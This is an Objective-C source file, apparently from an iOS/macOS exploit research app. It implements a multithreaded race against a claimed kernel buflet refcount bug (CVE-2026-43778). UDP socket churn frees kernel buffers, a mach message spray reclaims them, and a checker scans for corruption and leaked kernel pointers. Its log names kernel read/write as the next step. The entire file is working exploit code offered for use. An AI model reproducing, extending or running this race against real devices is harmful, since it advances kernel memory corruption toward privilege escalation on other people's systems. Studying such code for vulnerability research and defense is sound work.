//
//  P050GetattrlistOOB.m
//  v3: Fix port sharing — check thread uses same ports as reclaim
//

#import "P050GetattrlistOOB.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/message.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <netinet/udp.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <fcntl.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdarg.h>

#define P050_BUILD @"p050-buflet-uaf-v3"

static int g_log_fd = -1;

static void p050_log(NSMutableString *buf, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [buf appendString:out];
    if (g_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_log_fd, s, strlen(s));
            fcntl(g_log_fd, F_FULLFSYNC);
        }
    }
}

#define P050_N_SOCKETS    512
#define P050_N_MSGS       256
#define P050_MSG_SIZE     0x200
#define P050_RACE_SEC     30
#define P050_N_FREE_THREADS    4
#define P050_N_RECLAIM_THREADS 4

static volatile int g_stop = 0;
static volatile int g_race_hits = 0;
static volatile int g_total_sends = 0;
static volatile int g_total_recvs = 0;

/* SHARED port array — both reclaim and check threads use this */
static mach_port_t g_ports[P050_N_MSGS];
static volatile int g_ports_ready = 0;

/* Thread A: UDP socket create/send/close → buflet alloc/free race */
static void *p050_free_thread(void *arg) {
    int tid = (int)(intptr_t)arg;
    
    while (!g_stop) {
        int fds[P050_N_SOCKETS];
        int count = 0;
        
        for (int i = 0; i < P050_N_SOCKETS; i++) {
            fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (fds[i] < 0) continue;
            count++;
        }
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = htons(12345 + tid);
        
        char pkt[4096];
        memset(pkt, 0x41 + tid, sizeof(pkt));
        
        for (int round = 0; round < 3 && !g_stop; round++) {
            for (int i = 0; i < count; i++) {
                if (fds[i] < 0) continue;
                sendto(fds[i], pkt, sizeof(pkt), 0,
                       (struct sockaddr *)&addr, sizeof(addr));
                g_total_sends++;
            }
        }
        
        /* RACE: Close all sockets at once */
        for (int i = 0; i < count; i++) {
            if (fds[i] >= 0) {
                close(fds[i]);
                fds[i] = -1;
            }
        }
        
        usleep(10 + tid * 5);
    }
    
    return NULL;
}

/* Thread B: mach_msg spray to reclaim freed buflet memory
   Uses SHARED g_ports so check thread can receive */
static void *p050_reclaim_thread(void *arg) {
    int tid = (int)(intptr_t)arg;
    
    while (!g_stop) {
        for (int i = 0; i < P050_N_MSGS; i++) {
            /* Allocate port if needed (shared array) */
            if (!g_ports[i]) {
                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_ports[i]);
                mach_port_insert_right(mach_task_self(), g_ports[i], g_ports[i],
                                       MACH_MSG_TYPE_MAKE_SEND);
                g_ports_ready++;
            }
            
            size_t msg_size = sizeof(mach_msg_header_t) + P050_MSG_SIZE;
            uint8_t *msgbuf = calloc(1, msg_size);
            if (!msgbuf) continue;
            
            mach_msg_header_t *h = (mach_msg_header_t *)msgbuf;
            h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
            h->msgh_size = (mach_msg_size_t)msg_size;
            h->msgh_remote_port = g_ports[i];
            h->msgh_id = 0x50303500 | (tid << 8) | i;
            
            memset(msgbuf + sizeof(mach_msg_header_t), 0xB0 + tid, P050_MSG_SIZE);
            memcpy(msgbuf + sizeof(mach_msg_header_t), "P050", 4);
            uint32_t tag = (tid << 24) | i;
            memcpy(msgbuf + sizeof(mach_msg_header_t) + 4, &tag, 4);
            
            mach_msg(h, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0,
                     MACH_PORT_NULL, 0, MACH_PORT_NULL);
            free(msgbuf);
        }
        
        usleep(5 + tid * 3);
    }
    
    return NULL;
}

/* Thread C: Check for corruption using SHARED g_ports */
static void *p050_check_thread(void *arg) {
    (void)arg;
    uint8_t rbuf[0x400];
    
    /* Wait for ports to be ready */
    while (!g_stop && g_ports_ready < P050_N_MSGS) {
        usleep(10);
    }
    
    p050_log(nil, @"  [check] %d ports ready, starting corruption scan", g_ports_ready);
    
    while (!g_stop) {
        for (int i = 0; i < P050_N_MSGS; i++) {
            if (!g_ports[i]) continue;
            
            memset(rbuf, 0, sizeof(rbuf));
            mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
            kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                        0, sizeof(rbuf),
                                        g_ports[i], 50, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) continue;
            g_total_recvs++;
            
            uint8_t *body = rbuf + sizeof(mach_msg_header_t);
            
            if (memcmp(body, "P050", 4) != 0) {
                g_race_hits++;
                
                NSMutableString *dump = [NSMutableString string];
                for (int j = 0; j < 64 && j < P050_MSG_SIZE; j += 16) {
                    [dump appendFormat:@"%04x: ", j];
                    for (int k = 0; k < 16 && j + k < P050_MSG_SIZE; k++) {
                        [dump appendFormat:@"%02x ", body[j + k]];
                    }
                    [dump appendString:@"\n"];
                }
                p050_log(nil, @"[!] CORRUPTION at msg[%d]:\n%@", i, dump);
                
                for (int j = 0; j + 8 <= P050_MSG_SIZE; j += 8) {
                    uint64_t v = *(uint64_t *)&body[j];
                    if ((v >> 36) == 0xfffffff0ULL && (v & 0xFFFFULL) != 0) {
                        p050_log(nil, @"  ★★★ KPTR at body[0x%x] = 0x%016llx ★★★", j, v);
                        p050_log(nil, @"  ★★★ BUFLET UAF CONFIRMED ★★★");
                    }
                }
            } else {
                uint32_t tag = 0;
                memcpy(&tag, body + 4, 4);
                int expected_tid = (tag >> 24) & 0xff;
                int expected_idx = tag & 0xffffff;
                if (expected_tid < 0 || expected_tid > 15 || expected_idx >= P050_N_MSGS) {
                    g_race_hits++;
                    p050_log(nil, @"[!] TAG CORRUPTION at msg[%d]: tag=0x%08x", i, tag);
                }
            }
        }
        usleep(20);
    }
    
    return NULL;
}

@implementation P050GetattrlistOOB

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *logPath = [docs stringByAppendingPathComponent:@"p050_getattrlist_oob_log.txt"];
    g_log_fd = open([logPath UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
    
    p050_log(log, @"=== p050 session BUILD %@ ===", P050_BUILD);
    p050_log(log, @"CVE-2026-43778: pp_free_buflet refcount race → UAF");
    p050_log(log, @"v3: SHARED ports, %d free + %d reclaim + 1 check, %ds",
             P050_N_FREE_THREADS, P050_N_RECLAIM_THREADS, P050_RACE_SEC);
    p050_log(log, @"");
    
    /* Initialize shared port array */
    memset(g_ports, 0, sizeof(g_ports));
    g_ports_ready = 0;
    g_stop = 0;
    g_race_hits = 0;
    g_total_sends = 0;
    g_total_recvs = 0;
    
    /* Start threads */
    pthread_t free_tids[P050_N_FREE_THREADS];
    pthread_t reclaim_tids[P050_N_RECLAIM_THREADS];
    pthread_t check_tid;
    
    p050_log(log, @"[*] Starting threads...");
    
    for (int i = 0; i < P050_N_FREE_THREADS; i++) {
        pthread_create(&free_tids[i], NULL, p050_free_thread, (void *)(intptr_t)i);
    }
    for (int i = 0; i < P050_N_RECLAIM_THREADS; i++) {
        pthread_create(&reclaim_tids[i], NULL, p050_reclaim_thread, (void *)(intptr_t)i);
    }
    pthread_create(&check_tid, NULL, p050_check_thread, NULL);
    
    /* Run race */
    for (int t = 5; t <= P050_RACE_SEC; t += 5) {
        sleep(5);
        p050_log(log, @"[race] t=%ds sends=%d recvs=%d hits=%d ports=%d",
                 t, g_total_sends, g_total_recvs, g_race_hits, g_ports_ready);
    }
    
    g_stop = 1;
    
    for (int i = 0; i < P050_N_FREE_THREADS; i++) {
        pthread_join(free_tids[i], NULL);
    }
    for (int i = 0; i < P050_N_RECLAIM_THREADS; i++) {
        pthread_join(reclaim_tids[i], NULL);
    }
    pthread_join(check_tid, NULL);
    
    /* Cleanup shared ports */
    for (int i = 0; i < P050_N_MSGS; i++) {
        if (g_ports[i]) mach_port_destroy(mach_task_self(), g_ports[i]);
    }
    
    p050_log(log, @"");
    p050_log(log, @"=== VERDICT ===");
    p050_log(log, @"Total sends=%d recvs=%d hits=%d", g_total_sends, g_total_recvs, g_race_hits);
    
    if (g_race_hits > 0) {
        p050_log(log, @"★★★ BUFLET UAF CONFIRMED ★★★");
        p050_log(log, @"NEXT: Build controlled UAF → kread/kwrite");
    } else {
        p050_log(log, @"No corruption in %ds", P050_RACE_SEC);
        p050_log(log, @"NEXT: Try 64749 OOL probe or increase race window");    }
    
    if (g_log_fd >= 0) {
        fcntl(g_log_fd, F_FULLFSYNC);
        close(g_log_fd);
        g_log_fd = -1;
    }
    
    return log;
}

@end
